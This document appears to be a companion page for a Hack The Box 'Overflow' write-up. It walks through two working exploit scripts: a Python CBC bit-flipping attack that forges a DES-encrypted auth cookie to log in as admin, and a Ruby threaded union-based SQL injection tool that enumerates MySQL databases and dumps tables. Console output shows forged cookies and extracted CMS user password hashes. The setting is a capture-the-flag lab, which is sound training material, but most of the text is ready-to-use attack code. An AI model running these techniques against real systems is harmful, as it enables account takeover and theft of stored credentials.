# Hack The Box. Machines. Overflow

Machine write-up: https://7rocky.github.io/en/htb/overflow

### `bit_flipper.py`

This script performs a Bit Flipper Attack in a cookie that is encrypted with DES CBC (8-length block). The bit flip occurs at the IV, which is appended to the cookie after the encryption process (more information in the [write-up](https://7rocky.github.io/en/htb/overflow)).

I found two ways of getting a valid cookie for `admin` (so that the contents of the cookie would decrypt as `user=admin`). The first one creates a new user called `` `dmin`` or `bdmin` (ASCII letters near to `a`):

```python
def main_bf():
    original_cookie, original_length = do_login('`dmin')
    print(f'[+] Original cookie for user `dmin: {original_cookie}')

    n = len(to_hex(original_cookie)) * 4 - 1
    threads = []

    for i in range(n, -1, -1):
        try:
            cookie = b64e(l2b(int(to_hex(original_cookie), 16) ^ (1 << i)))
            threads.append(Thread(target=try_cookie,
                                  args=(cookie.decode(), original_length)))
        except UnicodeDecodeError:
            pass

    [t.start() for t in threads]
    [t.join() for t in threads]
```

Basically, the function takes the cookie from `` `dmin``, transforms it to an integer, makes a bit flip on each position and reverts it to Base64 encoding. Then it tries the cookie to see if it is valid for `admin`:

```python
def try_cookie(cookie: str, original_length: int):
    try:
        r = requests.get('http://overflow.htb/home/index.php',
                         headers={'Cookie': f'auth={cookie}'})
        if original_length < len(r.text):
            print(f'[*] Bit-flip cookie for user admin: {cookie}')
    except (ConnectionError, ValueError):
        pass
```

The value to check if the cookie is valid or not is the length of the response after setting the "Bit-flip" cookie. If it is greater, then we have successfully logged in as `admin`. We take the cookie and the length of an initial request from `do_login`:

```python
def do_login(user: str) -> Tuple[str, int]:
    pw = 'asdffdsa'
    r = requests.post('http://overflow.htb/register.php', allow_redirects=False,
                      data={'username': user, 'password': pw, 'password2': pw})

    if r.headers.get('Set-Cookie') is None:
        r = requests.post('http://overflow.htb/login.php', allow_redirects=False,
                          data={'username': user, 'password': pw})

    original_cookie = r.headers.get(
        'Set-Cookie')[len('auth='):].replace('%2F', '/')

    r = requests.get('http://overflow.htb/home/index.php',
                     headers={'Cookie': f'auth={original_cookie}'})
    original_length = len(r.text)

    return original_cookie, original_length
```

And this is some output:

```console
$ python3 bit_flipper.py
[+] Original cookie for user `dmin: 8XriuBxV78NQchc7XKNVUHlt4qIutBEK  
[*] Bit-flip cookie for user admin: 8XriuBxU78NQchc7XKNVUHlt4qIutBEK
```

After identifying that the cookie has the IV appended to it and the bit flip occurs right there, since the block size is 8 bytes and the cookie we want is `user=admin`, we could even create an account using `ZZZin` as username (cookie: `user=ZZZin`). We will be able to modify some bits from the IV so that when decrypting the cookie, it results in `user=admin`:

```python
def main_special():
    original_cookie, original_length = do_login('ZZZin')
    print(f'[+] Original cookie for user ZZZin: {original_cookie}')

    hex_cookie = to_hex(original_cookie)
    iv = hex_cookie[:16]
    prev_iv = int(iv, 16) ^ int(b'ZZZ'.hex(), 16)
    mod_iv = hex(prev_iv ^ int(b'adm'.hex(), 16))[2:]
    new_hex_cookie = mod_iv + hex_cookie[16:]
    new_hex_cookie = '0' * (len(new_hex_cookie) % 2) + new_hex_cookie
    new_cookie = b64e(binascii.unhexlify(new_hex_cookie)).decode()

    try_cookie(new_cookie, original_length)
```

It is based in XOR operations following the decryption scheme for CBC. These are the important lines:

```python
    hex_cookie = to_hex(original_cookie)
    iv = hex_cookie[:16]
    prev_iv = int(iv, 16) ^ int(b'ZZZ'.hex(), 16)
    mod_iv = hex(prev_iv ^ int(b'adm'.hex(), 16))[2:]
    new_hex_cookie = mod_iv + hex_cookie[16:]
```

```console
$ python3 bit_flipper.py
[+] Original cookie for user `dmin: v4x9O4JGWBefl0R7W2jyM5IHbat9NM1F
[*] Bit-flip cookie for user admin: v4x9O4JHWBefl0R7W2jyM5IHbat9NM1F
[*] Bit-flip cookie for user admin: v4x9O4LGWBefl0R7W2jyM5IHbat9NM1F
[+] Original cookie for user ZZZin: qa/85J7b/mbQeWjB/83qCDUgixOHCi3f
[*] Bit-flip cookie for user admin: qa/85J7gwFHQeWjB/83qCDUgixOHCi3f
```

Take a look at the [write-up](https://7rocky.github.io/en/htb/overflow) to see two more ways to access as `admin` and to view some nice graphics.

### `sqli.rb`

This script is used to exploit a SQL injection vulnerability (MySQL). It is designed to be used step by step (databases, tables, columns and values). For that, we make use of parameters:

```ruby
OptionParser.new do |opt|
  opt.on('--get-dbs') { |_o| options[:get_dbs] = true }
  opt.on('--db DATABASE_NAME') { |o| options[:db_name] = o }
  opt.on('--get-tables') { |_o| options[:get_tables] = true }
  opt.on('--table TABLE_NAME') { |o| options[:table_name] = o }
  opt.on('--get-columns') { |_o| options[:get_columns] = true }
  opt.on('--columns COLUMN_1[,COLUMN_2,...]') { |o| options[:columns] = o }
end.parse!
```

First of all, the type of SQLi is Union-based ni the third column and it must be done with a closing bracket (check the [machine write-up](https://7rocky.github.io/en/htb/overflow) for more information). Then we use some string manipulation to extract the information:

```ruby
def do_sqli(query)
  payload = "') union select 1,1,(#{query}) union select 1,1,('1"
  url = URI("http://overflow.htb/home/logs.php?name=#{payload}")

  cookie = 'auth=27D0zsl796kY3V6LjcNvRu3vWRAmWEBA'
  res = Net::HTTP.get(url, { Cookie: cookie })

  return '' if res.empty?

  res.split("<div id='last'>Last login : ").last.delete_suffix('</div><br>')
end
```

Notice that we provided a cookie to access as `admin` (it was required to access the vulnerable route).

To improve the speed of the requests, we can make use of threads:

```ruby
def do_sqli_threads(query, number)
  res = Array.new(number)
  threads = Array.new(number)

  (0...number).each do |i|
    threads[i] = Thread.new { res[i] = do_sqli("#{query} limit #{i},1") }
  end

  threads.each(&:join)
  res
end
```

The above function is used when a table has more than one row, so that every row is extracted nearly at the same time. Hence, for every information leakage, we first count the number of values to initialize the threads.

For example, we have this code snippet to extract the databases:

```ruby
if options[:get_dbs]
  n = do_sqli('select count(*) from information_schema.schemata').to_i
  puts "[*] Number of databases: #{n}.\n\n"

  query = 'select schema_name from information_schema.schemata'

  puts do_sqli_threads(query, n)
  exit
end
```

```console
$ ruby sqli.rb --get-dbs
[*] Number of databases: 4.  

information_schema
Overflow
cmsmsdb
logs
```

Most of the other blocks are similar. The one that is different is this:

```ruby
unless options[:db_name].empty? || options[:table_name].empty? || options[:columns].empty?
  db_name = options[:db_name]
  table_name = options[:table_name]
  column_names = options[:columns].split(',')
  columns = column_names.join(",' *** ',")

  n = do_sqli("select count(*) from #{db_name}.#{table_name}").to_i
  puts "[*] Number of rows in #{db_name}.#{table_name}: #{n}.\n\n"

  query = "select concat(#{columns}) from #{db_name}.#{table_name}"

  res = do_sqli_threads(query, n)

  res.each_with_index do |result, i|
    res_obj = {}
    result.split(' *** ').each_with_index { |r, j| res_obj[column_names[j]] = r }
    res[i] = res_obj
  end

  col_labels = {}
  column_names.each { |c| col_labels[c] = c }

  columns = col_labels.each_with_object({}) do |(col, label), h|
    h[col] = { label:, width: [res.map { |g| g[col].size }.max, label.size].max }
  end

  write_table(res, columns)
end
```

It is used to show the contents of given columns from a table in such a beautiful table:

```console
$ ruby sqli.rb --db cmsmsdb --table cms_users --columns user_id,username,password,admin_access  
[*] Number of rows in cmsmsdb.cms_users: 2.

+---------+----------+----------------------------------+--------------+
| user_id | username | password                         | admin_access |
+---------+----------+----------------------------------+--------------+
| 1       | admin    | c6c6b9310e0e6f3eb3ffeb2baff12fdd | 1            |
| 3       | editor   | e3d748d58b58657bfa4dffe2def0b1c7 | 1            |
+---------+----------+----------------------------------+--------------+
```

Take a look at the source code to see other functions.
